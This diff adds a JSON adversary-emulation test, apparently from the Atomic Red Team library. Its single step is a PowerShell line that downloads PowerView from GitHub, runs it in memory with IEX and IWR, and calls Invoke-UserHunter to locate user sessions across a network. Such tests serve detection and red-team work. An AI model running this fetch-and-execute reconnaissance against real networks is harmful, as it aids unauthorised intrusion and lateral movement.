@@ -1,0 +1,23 @@
+{
+  "id": "29857f27-a36f-4f7e-8084-4557cd6207ca",
+  "name": "Find computers where user has session - Stealth mode (PowerView)",
+  "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "943d85be-60d4-4b30-8926-f0f54f45cbed",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1033",
+    "atomic-red-team"
+  ]
+}
